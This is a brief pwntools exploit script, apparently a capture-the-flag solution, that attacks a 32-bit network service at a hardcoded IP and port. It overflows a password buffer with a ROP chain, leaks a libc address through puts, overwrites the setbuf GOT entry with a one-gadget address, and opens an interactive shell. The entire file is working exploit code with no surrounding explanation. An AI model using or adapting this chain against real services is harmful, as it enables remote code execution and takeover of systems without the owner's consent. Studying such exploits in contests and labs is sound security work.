from pwn import *

exe = ELF('service')

io = connect('144.217.73.235',26213)

gadget1 = 0x080492d3 # pop ebp ; ret

# dump some got entries with puts to calculate libc base & identify remote libc (libc6-i386_2.28-10_amd64.so) with https://libc.blukat.me
# then read 4 bytes in setbuf got entry (write onegadget address instead) & call it via set_buf_plt
payload = p32(0xdeadbeef)*27+p32(0x41414141)+p32(exe.symbols['puts'])+p32(gadget1)+p32(exe.got['read'])+p32(exe.symbols['read'])+p32(exe.symbols['setbuf'])+p32(0)+p32(exe.got['setbuf'])+p32(4)
io.sendlineafter('password: \n', payload)

# receive our leak, from puts & calculate libc base
buff = io.recvuntil('\n', drop=True)
libc_base = u32(buff[0:4]) - 0xe7ea0
print('libc base: '+hex(libc_base))

io.send(p32(libc_base+0x68fcc))	# send onegadget address
io.interactive()

